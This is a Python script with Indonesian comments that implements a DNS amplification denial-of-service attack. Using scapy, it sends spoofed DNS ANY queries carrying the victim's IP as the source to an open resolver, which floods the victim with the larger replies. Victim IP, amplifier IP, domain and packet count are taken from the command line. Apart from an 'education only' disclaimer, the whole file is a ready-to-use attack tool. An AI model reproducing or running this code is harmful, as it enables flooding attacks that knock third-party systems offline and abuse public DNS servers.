# dns_amp_initiator.py
# PERINGATAN: SKRIP INI HANYA UNTUK EDUKASI. IP SPOOFING ILEGAL TANPA IZIN.

import argparse
import random
import sys
import time
from scapy.all import IP, UDP, DNS, DNSQR, send

def launch_amplification_attack(victim_ip, amplifier_ip, domain, count):
    """
    Mensimulasikan pengiriman paket DNS query dengan IP sumber yang dipalsukan.
    """
    print(f"[*] Menargetkan korban: {victim_ip}")
    print(f"[*] Menggunakan amplifier: {amplifier_ip}")
    print(f"[*] Mengirim {count} query untuk domain '{domain}'...")

    for i in range(count):
        # Pilih port sumber secara acak
        source_port = random.randint(1025, 65535)

        # 1. Membuat lapisan IP: Inilah bagian "fitnah" atau spoofing.
        #    src = IP Korban, dst = IP Amplifier
        ip_layer = IP(src=victim_ip, dst=amplifier_ip)

        # 2. Membuat lapisan UDP
        #    sport = port acak, dport = 53 (DNS)
        udp_layer = UDP(sport=source_port, dport=53)

        # 3. Membuat lapisan DNS Query
        #    qtype='ANY' meminta SEMUA record, menghasilkan jawaban terbesar untuk amplifikasi
        dns_layer = DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))

        # 4. Gabungkan semua lapisan menjadi satu paket lengkap
        packet = ip_layer / udp_layer / dns_layer

        # 5. Kirim paket! verbose=False agar tidak memenuhi terminal.
        send(packet, verbose=False)
        
        print(f"\r[*] Paket terkirim: {i + 1}/{count}", end="")
        time.sleep(0.01) # Jeda kecil

    print(f"\n[+] Selesai. {count} paket telah dikirim ke amplifier.")

def main():
    parser = argparse.ArgumentParser(description="DNS Amplification Attack Initiator")
    parser.add_argument("-t", "--target", required=True, help="Alamat IP korban (yang akan difitnah dan dibanjiri)")
    parser.add_argument("-a", "--amplifier", required=True, help="Alamat IP server Open Resolver sebagai amplifier")
    parser.add_argument("-d", "--domain", default="isc.org", help="Domain untuk di-query (pilih yang punya banyak record, default: isc.org)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Jumlah paket yang akan dikirim (default: 100)")
    
    args = parser.parse_args()

    # Membutuhkan hak akses root untuk melakukan IP spoofing
    if not sys.platform.startswith('linux'):
        print("[!] Skrip ini memerlukan hak akses root dan dirancang untuk Linux.")
        sys.exit(1)
        
    launch_amplification_attack(args.target, args.amplifier, args.domain, args.count)

if __name__ == "__main__":
    main()
